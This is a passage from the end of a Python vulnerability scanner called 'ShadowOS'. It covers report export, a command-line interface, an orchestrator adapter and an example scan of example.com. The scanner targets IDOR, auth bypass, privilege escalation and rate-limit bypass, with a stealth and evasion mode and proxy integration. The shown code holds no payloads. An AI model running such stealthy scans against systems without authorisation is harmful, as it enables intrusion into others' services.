            return self.export_markdown()
        else:
            raise ValueError(f"Unsupported export format: {format_type}")
            
    def export_json(self) -> str:
        """Export findings as JSON"""
        export_data = {
            "scan_info": {
                "target_domain": self.config.target_domain,
                "scan_types": [t.value for t in self.config.scan_types],
                "scan_date": datetime.now().isoformat(),
                "scanner_version": "ShadowOS v1.0"
            },
            "statistics": self.get_scan_statistics(),
            "findings": [asdict(finding) for finding in self.findings]
        }
        
        # Convert datetime objects to ISO format
        for finding in export_data["findings"]:
            if "discovered_at" in finding:
                finding["discovered_at"] = finding["discovered_at"].isoformat()
            # Convert enums to strings
            finding["vuln_type"] = finding["vuln_type"].value
            finding["severity"] = finding["severity"].value
            
        return json.dumps(export_data, indent=2, default=str)
        
    def export_markdown(self) -> str:
        """Export findings as Markdown report"""
        markdown = f"""# ShadowOS Security Scan Report

## Target Information
- **Domain:** {self.config.target_domain}
- **Scan Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
- **Scanner Version:** ShadowOS v1.0

## Executive Summary
"""
        
        stats = self.get_scan_statistics()
        markdown += f"""
- **Total Findings:** {stats['total_findings']}
- **Critical Issues:** {stats['critical_findings']}
- **High Severity Issues:** {stats['high_findings']}
- **Scan Duration:** {stats['scan_duration_seconds']:.0f} seconds
- **Requests Made:** {stats['total_requests']}

## Findings by Severity
"""
        
        for severity, count in stats['findings_by_severity'].items():
            if count > 0:
                markdown += f"- **{severity.upper()}:** {count}\n"
                
        markdown += "\n## Detailed Findings\n\n"
        
        for i, finding in enumerate(self.findings, 1):
            markdown += f"""### {i}. {finding.title}

**Severity:** {finding.severity.value.upper()}  
**Type:** {finding.vuln_type.value}  
**URL:** {finding.url}  
**Confidence:** {finding.confidence:.2f}  

**Description:**
{finding.description}

**Business Impact:**
{finding.business_impact}

**Proof of Concept:**
"""
            for step in finding.poc_steps:
                markdown += f"{step}\n"
                
            markdown += f"""
**Remediation:**
{finding.remediation}

---

"""
        
        return markdown


# CLI Interface for Scanner Engine
def create_scanner_cli():
    """Create CLI interface for scanner"""
    import argparse
    
    parser = argparse.ArgumentParser(description="ShadowOS Scanner Engine")
    subparsers = parser.add_subparsers(dest="command", help="Available commands")
    
    # Scan command
    scan_parser = subparsers.add_parser("scan", help="Run vulnerability scan")
    scan_parser.add_argument("domain", help="Target domain")
    scan_parser.add_argument("--types", nargs="+", 
                           choices=["idor", "auth_bypass", "business_logic", "rate_limit_bypass", "privilege_escalation", "info_disclosure", "api_abuse"],
                           default=["idor", "auth_bypass"], help="Vulnerability types to scan")
    scan_parser.add_argument("--intensity", choices=["light", "normal", "aggressive"], default="normal")
    scan_parser.add_argument("--output", help="Output file for results")
    scan_parser.add_argument("--format", choices=["json", "markdown", "csv"], default="json")
    scan_parser.add_argument("--config", help="Configuration file")
    
    return parser

async def run_scanner_cli():
    """Run scanner CLI"""
    parser = create_scanner_cli()
    args = parser.parse_args()
    
    if not args.command:
        parser.print_help()
        return
        
    if args.command == "scan":
        print(f"🚀 Starting ShadowOS Scanner for {args.domain}")
        
        # Map string types to enums
        type_mapping = {
            "idor": VulnerabilityType.IDOR,
            "auth_bypass": VulnerabilityType.AUTH_BYPASS,
            "business_logic": VulnerabilityType.BUSINESS_LOGIC,
            "rate_limit_bypass": VulnerabilityType.RATE_LIMIT_BYPASS,
            "privilege_escalation": VulnerabilityType.PRIVILEGE_ESCALATION,
            "info_disclosure": VulnerabilityType.INFO_DISCLOSURE,
            "api_abuse": VulnerabilityType.API_ABUSE
        }
        
        scan_types = [type_mapping[t] for t in args.types if t in type_mapping]
        
        # Create scanner configuration
        config = ScanConfiguration(
            target_domain=args.domain,
            scan_types=scan_types,
            intensity=args.intensity,
            max_concurrent=3,
            timeout=30,
            retry_count=2,
            rate_limit_global=60,
            stealth_mode=True,
            deep_scan=args.intensity == "aggressive",
            custom_payloads={},
            auth_config={},
            proxy_config=None
        )
        
        # Load additional config if provided
        if args.config:
            with open(args.config, 'r') as f:
                additional_config = yaml.safe_load(f)
                
            # Update config with file settings
            if "auth_config" in additional_config:
                config.auth_config = additional_config["auth_config"]
            if "custom_payloads" in additional_config:
                config.custom_payloads = additional_config["custom_payloads"]
            if "proxy_config" in additional_config:
                config.proxy_config = additional_config["proxy_config"]
                
        # Initialize scanner
        scanner = ShadowScannerEngine(config)
        
        print(f"🎯 Scan types: {[t.value for t in scan_types]}")
        print(f"⚡ Intensity: {args.intensity}")
        print(f"🔧 Max concurrent: {config.max_concurrent}")
        
        # Run scan
        try:
            findings = await scanner.scan_vulnerabilities()
            
            # Display results
            print(f"\n✅ Scan completed!")
            stats = scanner.get_scan_statistics()
            
            print(f"📊 Results:")
            print(f"   • Total findings: {stats['total_findings']}")
            print(f"   • Critical: {stats['critical_findings']}")
            print(f"   • High: {stats['high_findings']}")
            print(f"   • Requests made: {stats['total_requests']}")
            print(f"   • Duration: {stats['scan_duration_seconds']:.0f}s")
            
            # Export results
            if args.output:
                export_data = scanner.export_findings(args.format)
                
                with open(args.output, 'w') as f:
                    f.write(export_data)
                    
                print(f"💾 Results exported to: {args.output}")
            else:
                # Print summary to console
                if findings:
                    print(f"\n🔍 Top 5 Findings:")
                    for i, finding in enumerate(findings[:5], 1):
                        print(f"   {i}. {finding.title}")
                        print(f"      Severity: {finding.severity.value.upper()}")
                        print(f"      URL: {finding.url}")
                        print(f"      Confidence: {finding.confidence:.2f}")
                        print()
                        
        except Exception as e:
            print(f"❌ Scan failed: {str(e)}")
            import traceback
            traceback.print_exc()


# Integration helpers for Mission Orchestrator
class ScannerModuleAdapter:
    """Adapter class for integration with Mission Orchestrator"""
    
    def __init__(self, proxy_manager=None):
        self.proxy_manager = proxy_manager
        
    async def scan_vulnerabilities(self, target_domain: str, **parameters) -> Dict[str, Any]:
        """Main method called by Mission Orchestrator"""
        
        # Extract scan configuration from parameters
        scan_types_str = parameters.get("scan_types", ["idor", "auth_bypass"])
        intensity = parameters.get("intensity", "normal")
        
        # Convert string types to enums
        type_mapping = {
            "idor": VulnerabilityType.IDOR,
            "idor_horizontal": VulnerabilityType.IDOR,
            "idor_vertical": VulnerabilityType.IDOR,
            "idor_batch": VulnerabilityType.IDOR,
            "auth_bypass": VulnerabilityType.AUTH_BYPASS,
            "business_logic": VulnerabilityType.BUSINESS_LOGIC,
            "injection": VulnerabilityType.SQL_INJECTION,
            "sql_injection": VulnerabilityType.SQL_INJECTION,
            "xss": VulnerabilityType.XSS,
            "rate_limit_bypass": VulnerabilityType.RATE_LIMIT_BYPASS,
            "privilege_escalation": VulnerabilityType.PRIVILEGE_ESCALATION,
            "info_disclosure": VulnerabilityType.INFO_DISCLOSURE,
            "api_abuse": VulnerabilityType.API_ABUSE,
            "api_idor": VulnerabilityType.API_ABUSE
        }
        
        scan_types = []
        for scan_type in scan_types_str:
            if scan_type in type_mapping:
                vuln_type = type_mapping[scan_type]
                if vuln_type not in scan_types:
                    scan_types.append(vuln_type)
                    
        # Create scanner configuration
        config = ScanConfiguration(
            target_domain=target_domain,
            scan_types=scan_types,
            intensity=intensity,
            max_concurrent=parameters.get("max_concurrent", 3),
            timeout=parameters.get("timeout", 30),
            retry_count=parameters.get("retry_count", 2),
            rate_limit_global=parameters.get("rate_limit", 60),
            stealth_mode=parameters.get("stealth_mode", True),
            deep_scan=intensity == "aggressive",
            custom_payloads=parameters.get("custom_payloads", {}),
            auth_config=parameters.get("auth_config", {}),
            proxy_config=parameters.get("proxy_config")
        )
        
        # Get intel data if provided
        intel_data = parameters.get("use_intel_data", {})
        
        # Initialize scanner
        scanner = ShadowScannerEngine(config, self.proxy_manager, intel_data)
        
        # Run scan
        findings = await scanner.scan_vulnerabilities()
        
        # Format results for Mission Orchestrator
        vulnerabilities = []
        for finding in findings:
            vuln_dict = asdict(finding)
            # Convert enums and datetime to strings
            vuln_dict["vuln_type"] = finding.vuln_type.value
            vuln_dict["severity"] = finding.severity.value
            vuln_dict["discovered_at"] = finding.discovered_at.isoformat()
            vulnerabilities.append(vuln_dict)
            
        stats = scanner.get_scan_statistics()
        
        return {
            "scan_completed": True,
            "vulnerabilities": vulnerabilities,
            "statistics": stats,
            "findings_count": len(findings),
            "critical_count": len([f for f in findings if f.severity == SeverityLevel.CRITICAL]),
            "high_count": len([f for f in findings if f.severity == SeverityLevel.HIGH]),
            "scans_completed": 1,
            "target_domain": target_domain,
            "scan_types": [t.value for t in scan_types]
        }
        
    async def execute(self, target_domain: str, **parameters) -> Dict[str, Any]:
        """Generic execute method for Mission Orchestrator compatibility"""
        return await self.scan_vulnerabilities(target_domain, **parameters)


# Example usage and testing
async def example_scan():
    """Example usage of the scanner engine"""
    print("🚀 ShadowOS Scanner Engine - Example Scan")
    
    # Configuration
    config = ScanConfiguration(
        target_domain="example.com",
        scan_types=[
            VulnerabilityType.IDOR,
            VulnerabilityType.AUTH_BYPASS,
            VulnerabilityType.BUSINESS_LOGIC
        ],
        intensity="normal",
        max_concurrent=2,
        timeout=30,
        retry_count=2,
        rate_limit_global=60,
        stealth_mode=True,
        deep_scan=False,
        custom_payloads={
            "idor_custom": ["custom_id_1", "custom_id_2"]
        },
        auth_config={
            "type": "session",
            "login_url": "https://example.com/login",
            "username": "testuser",
            "password": "testpass"
        },
        proxy_config=None
    )
    
    # Mock intel data
    intel_data = {
        "endpoints": [
            {
                "url": "https://example.com/api/user/profile",
                "method": "GET",
                "parameters": {"user_id": "123"}
            },
            {
                "url": "https://example.com/admin/users",
                "method": "GET",
                "parameters": {}
            }
        ],
        "subdomains": ["api.example.com", "admin.example.com"]
    }
    
    # Initialize scanner
    scanner = ShadowScannerEngine(config, intel_data=intel_data)
    
    print(f"🎯 Target: {config.target_domain}")
    print(f"🔍 Scan types: {[t.value for t in config.scan_types]}")
    print(f"⚡ Intensity: {config.intensity}")
    
    try:
        # Run scan
        findings = await scanner.scan_vulnerabilities()
        
        # Display results
        stats = scanner.get_scan_statistics()
        print(f"\n✅ Scan completed!")
        print(f"📊 Statistics:")
        print(f"   • Duration: {stats['scan_duration_seconds']:.0f}s")
        print(f"   • Total findings: {stats['total_findings']}")
        print(f"   • Critical: {stats['critical_findings']}")
        print(f"   • High: {stats['high_findings']}")
        print(f"   • Requests made: {stats['total_requests']}")
        
        if findings:
            print(f"\n🔍 Sample Findings:")
            for finding in findings[:3]:
                print(f"   • {finding.title}")
                print(f"     Severity: {finding.severity.value}")
                print(f"     URL: {finding.url}")
                print(f"     Confidence: {finding.confidence:.2f}")
                print()
                
        # Export results
        json_export = scanner.export_findings("json")
        with open("scan_results.json", "w") as f:
            f.write(json_export)
            
        markdown_export = scanner.export_findings("markdown")
        with open("scan_report.md", "w") as f:
            f.write(markdown_export)
            
        print("💾 Results exported to scan_results.json and scan_report.md")
        
    except Exception as e:
        print(f"❌ Scan failed: {str(e)}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) > 1:
        # CLI mode
        asyncio.run(run_scanner_cli())
    else:
        # Example mode
        asyncio.run(example_scan())

"""
🔥 SHADOWOS SCANNER ENGINE - DEPLOYMENT READY! 💥

INTEGRATION CHECKLIST:
✅ Mission Orchestrator Ready - ScannerModuleAdapter class
✅ Proxy Manager Integration - Uses proxy_manager for stealth
✅ Intel Engine Integration - Consumes intel_data for targeted scanning
✅ Multiple Vulnerability Types - IDOR, Auth Bypass, Business Logic, etc.
✅ Advanced Detection Algorithms - Multi-vector IDOR, Parameter manipulation
✅ Authentication Support - JWT, Session, API Key, OAuth
✅ Rate Limiting & Stealth - Respectful scanning with evasion
✅ Comprehensive Reporting - JSON, Markdown, CSV export
✅ CLI Interface - Standalone operation capability
✅ Statistics & Metrics - Detailed scan analytics

NEXT INTEGRATION:
🎯 Register with Mission Orchestrator:
   orchestrator.register_module(ModuleType.SCANNER, ScannerModuleAdapter(proxy_manager))

🚀 READY FOR PRODUCTION DEPLOYMENT!
"""
